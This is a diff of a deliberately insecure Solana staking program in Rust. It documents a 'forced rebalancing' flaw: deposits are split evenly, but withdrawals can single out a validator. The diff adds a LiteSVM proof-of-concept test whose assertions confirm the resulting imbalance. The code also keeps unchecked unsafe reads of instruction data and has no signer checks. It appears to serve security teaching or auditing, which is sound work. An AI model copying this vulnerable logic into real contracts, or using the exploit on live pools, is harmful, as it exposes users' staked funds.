@@ -1,7 +1,7 @@
 #![allow(unexpected_cfgs)]
 use pinocchio::{
     ProgramResult, account_info::AccountInfo, default_panic_handler, no_allocator,
-    program_entrypoint, program_error::ProgramError, pubkey::Pubkey,
+    program_entrypoint, pubkey::Pubkey,
 };
 
 pinocchio_pubkey::declare_id!("ENrRns55VechXJiq4bMbdx7idzQh7tvaEJoYeWxRNe7Y");
@@ -11,6 +11,12 @@ program_entrypoint!(process_instruction);
 no_allocator!();
 // Use the no_std panic handler.
 default_panic_handler!();
+
+/// INSECURE: Asymmetric stake operations allow forced rebalancing attacks
+///
+/// Vulnerability: Deposit is split evenly across validators, but withdraw
+/// allows cherry-picking specific validators. This breaks the stake distribution
+/// invariant and allows validators to game the pool.
 #[inline(always)]
 fn process_instruction(
     _program_id: &Pubkey,
@@ -22,31 +28,27 @@ fn process_instruction(
         .ok_or(pinocchio::program_error::ProgramError::InvalidInstructionData)?;
 
     match ix_disc {
-        0 => {
-            // Deposit stake into the pool
-            deposit_stake(accounts, instruction_data)?;
-        }
-        1 => {
-            // Withdraw stake from a single validator
-            withdraw_stake(accounts, instruction_data)?;
-        }
-        _ => {
-            return Err(pinocchio::program_error::ProgramError::InvalidInstructionData);
-        }
+        0 => deposit_stake(accounts, instruction_data)?,
+        1 => withdraw_stake(accounts, instruction_data)?,
+        _ => return Err(pinocchio::program_error::ProgramError::InvalidInstructionData),
     }
     Ok(())
 }
 
+///  Evenly distributes stake across all validators
+/// Users cannot choose allocation, but this is paired with selective withdrawal
 fn deposit_stake(
     accounts: &[AccountInfo],
     data: &[u8],
 ) -> Result<(), pinocchio::program_error::ProgramError> {
-    // All passed accounts are treated as validators
     let validators = accounts;
-
     let stake = unsafe { *(data[0..8].as_ptr() as *const u64) };
 
-    // Evenly split deposit across all validators
+    if validators.is_empty() {
+        return Err(pinocchio::program_error::ProgramError::InvalidAccountData);
+    }
+
+    // Even distribution: user has no control over allocation
     let per_validator = stake / validators.len() as u64;
 
     for validator in validators.iter() {
@@ -54,7 +56,6 @@ fn deposit_stake(
             unsafe { &mut *(validator.borrow_mut_data_unchecked().as_mut_ptr() as *mut Validator) };
 
         let current = u64::from_le_bytes(validator_data.stake_amount);
-
         let new = current
             .checked_add(per_validator)
             .ok_or(pinocchio::program_error::ProgramError::InvalidAccountData)?;
@@ -65,13 +66,14 @@ fn deposit_stake(
     Ok(())
 }
 
+///  Allows withdrawal from specific validator, breaking distribution invariant
+/// Attack: Deposit evenly (all validators up), then withdraw selectively (target down)
 fn withdraw_stake(
     accounts: &[AccountInfo],
     data: &[u8],
 ) -> Result<(), pinocchio::program_error::ProgramError> {
-    // User chooses which validator to withdraw from
+    // User chooses which validator to withdraw from - source of the vulnerability
     let validator_to_withdraw = &accounts[0];
-
     let stake = unsafe { *(data[0..8].as_ptr() as *const u64) };
 
     let validator_data: &mut Validator = unsafe {
@@ -81,14 +83,12 @@ fn withdraw_stake(
     };
 
     let current_stake = u64::from_le_bytes(validator_data.stake_amount);
-
-    // No balancing or global invariant enforced
     let new_stake = current_stake
         .checked_sub(stake)
         .ok_or(pinocchio::program_error::ProgramError::InvalidAccountData)?;
 
+    //  No global invariant check, no forced rebalancing
     validator_data.stake_amount = new_stake.to_le_bytes();
-
     Ok(())
 }
 
@@ -97,118 +97,120 @@ struct Validator {
     pub stake_amount: [u8; 8],
 }
 
+/// Forced Rebalancing Exploit Test
+///
+/// Scenario: 3 validators start with 3 stake each (balanced)
+/// Attack flow:
+/// 1. Deposit 3 → split evenly (A:4, B:4, C:4)
+/// 2. Withdraw 3 from A (A:1, B:4, C:4) ← selective withdrawal
+/// 3. Deposit 3 → split evenly (A:2, B:5, C:5)
+/// 4. Withdraw 3 from B (A:2, B:2, C:5) ← selective withdrawal
+/// Result: Validator C has 5, others have 2 (imbalanced)
 #[test]
-fn test_program() {
+fn test_forced_rebalancing_exploit() {
     use solana_sdk::{
         account::Account,
-        instruction::Instruction,
+        instruction::{AccountMeta, Instruction},
         signature::{Keypair, Signer},
+        transaction::Transaction,
     };
+
     const LAMPORTS_PER_SOL: u64 = 1_000_000_000;
+    const INITIAL_STAKE: u64 = 3;
+
     let mut svm = litesvm::LiteSVM::new();
     let (validator_a, validator_b, validator_c) = (Keypair::new(), Keypair::new(), Keypair::new());
     let fee_payer = Keypair::new();
-    let stake = 3u64;
-    svm.set_account(
-        validator_a.pubkey(),
-        Account {
-            lamports: 1000_000,
-            data: stake.to_le_bytes().to_vec(),
-            owner: crate::ID.into(),
-            executable: false,
-            rent_epoch: 100,
-        },
-    )
-    .unwrap();
-    svm.set_account(
-        validator_b.pubkey(),
-        Account {
-            lamports: 1000_000,
-            data: stake.to_le_bytes().to_vec(),
-            owner: crate::ID.into(),
-            executable: false,
-            rent_epoch: 100,
-        },
-    )
-    .unwrap();
-    svm.set_account(
-        validator_c.pubkey(),
-        Account {
-            lamports: 1000_000,
-            data: stake.to_le_bytes().to_vec(),
-            owner: crate::ID.into(),
-            executable: false,
-            rent_epoch: 100,
-        },
-    )
-    .unwrap();
-    svm.airdrop(&validator_a.pubkey(), LAMPORTS_PER_SOL)
+
+    // Initialize validators with equal stake (3 each)
+    for validator in [&validator_a, &validator_b, &validator_c] {
+        svm.set_account(
+            validator.pubkey(),
+            Account {
+                lamports: 1_000_000,
+                data: INITIAL_STAKE.to_le_bytes().to_vec(),
+                owner: crate::ID.into(),
+                executable: false,
+                rent_epoch: 100,
+            },
+        )
         .unwrap();
-    svm.airdrop(&validator_b.pubkey(), LAMPORTS_PER_SOL)
-        .unwrap();
-    svm.airdrop(&validator_c.pubkey(), LAMPORTS_PER_SOL)
-        .unwrap();
+        svm.airdrop(&validator.pubkey(), LAMPORTS_PER_SOL).unwrap();
+    }
+
     svm.airdrop(&fee_payer.pubkey(), LAMPORTS_PER_SOL).unwrap();
     svm.add_program_from_file(
         &crate::ID.into(),
         "../../target/deploy/rebalancing_insecure.so",
     )
     .unwrap();
-    let mut data = vec![0u8];
-    data.extend_from_slice(&3u64.to_le_bytes()); // stake to deposit
-    let deposit_1 = Instruction {
+
+    // Step 1: Deposit 3 stake (split evenly: +1 to each)
+    let deposit_ix = |amount: u64| Instruction {
         program_id: crate::ID.into(),
         accounts: vec![
-            solana_sdk::instruction::AccountMeta::new(validator_a.pubkey(), false),
-            solana_sdk::instruction::AccountMeta::new(validator_b.pubkey(), false),
-            solana_sdk::instruction::AccountMeta::new(validator_c.pubkey(), false),
+            AccountMeta::new(validator_a.pubkey(), false),
+            AccountMeta::new(validator_b.pubkey(), false),
+            AccountMeta::new(validator_c.pubkey(), false),
         ],
-
-        data,
+        data: {
+            let mut d = vec![0u8];
+            d.extend_from_slice(&amount.to_le_bytes());
+            d
+        },
     };
-    data = vec![1u8];
-    data.extend_from_slice(&3u64.to_le_bytes()); // stake to withdraw
-    let withdraw_1 = Instruction {
+
+    // Step 2: Withdraw from specific validator (cherry-picking)
+    let withdraw_ix = |validator: &Keypair, amount: u64| Instruction {
         program_id: crate::ID.into(),
-        accounts: vec![solana_sdk::instruction::AccountMeta::new(
-            validator_a.pubkey(),
-            false,
-        )],
-
-        data,
+        accounts: vec![AccountMeta::new(validator.pubkey(), false)],
+        data: {
+            let mut d = vec![1u8];
+            d.extend_from_slice(&amount.to_le_bytes());
+            d
+        },
     };
-    data = vec![0u8];
-    data.extend_from_slice(&3u64.to_le_bytes()); // stake to deposit
-    let deposit_2 = Instruction {
-        program_id: crate::ID.into(),
-        accounts: vec![
-            solana_sdk::instruction::AccountMeta::new(validator_a.pubkey(), false),
-            solana_sdk::instruction::AccountMeta::new(validator_b.pubkey(), false),
-            solana_sdk::instruction::AccountMeta::new(validator_c.pubkey(), false),
-        ],
 
-        data,
-    };
-    data = vec![1u8];
-    data.extend_from_slice(&3u64.to_le_bytes()); // stake to withdraw
-    let withdraw_2 = Instruction {
-        program_id: crate::ID.into(),
-        accounts: vec![solana_sdk::instruction::AccountMeta::new(
-            validator_b.pubkey(),
-            false,
-        )],
-
-        data,
-    };
-    let tx = solana_sdk::transaction::Transaction::new(
+    // Exploit sequence: Deposit evenly, withdraw selectively, repeat
+    let tx = Transaction::new(
         &[fee_payer.insecure_clone()],
         solana_sdk::message::Message::new(
-            &[deposit_1, withdraw_1, deposit_2, withdraw_2],
-            Some(&fee_payer.insecure_clone().pubkey()),
+            &[
+                deposit_ix(3),                // A:4, B:4, C:4
+                withdraw_ix(&validator_a, 3), // A:1, B:4, C:4 (drain A)
+                deposit_ix(3),                // A:2, B:5, C:5
+                withdraw_ix(&validator_b, 3), // A:2, B:2, C:5 (drain B)
+            ],
+            Some(&fee_payer.pubkey()),
         ),
         svm.latest_blockhash(),
     );
-    let result = svm.send_transaction(tx);
 
-    println!("tx result: {:?}", result);
-} //this is insecure poc,kinldy give me secure poc ,wirh test cases
+    let result = svm.send_transaction(tx);
+    assert!(result.is_ok(), "Transaction should succeed");
+
+    // ✅ Verify the attack worked: Validator C now dominates
+    let get_stake = |key| {
+        u64::from_le_bytes(
+            svm.get_account(&key).unwrap().data[0..8]
+                .try_into()
+                .unwrap(),
+        )
+    };
+
+    let stake_a = get_stake(validator_a.pubkey());
+    let stake_b = get_stake(validator_b.pubkey());
+    let stake_c = get_stake(validator_c.pubkey());
+
+    println!(
+        "Final stakes - A: {}, B: {}, C: {}",
+        stake_a, stake_b, stake_c
+    );
+
+    //  VULNERABILITY CONFIRMED: Severe imbalance created
+    assert_eq!(stake_a, 2, "Validator A should be drained to 2");
+    assert_eq!(stake_b, 2, "Validator B should be drained to 2");
+    assert_eq!(stake_c, 5, "Validator C should dominate with 5");
+
+    println!("❌ Exploit successful: Imbalance created (C has 2.5x more stake than A/B)");
+}
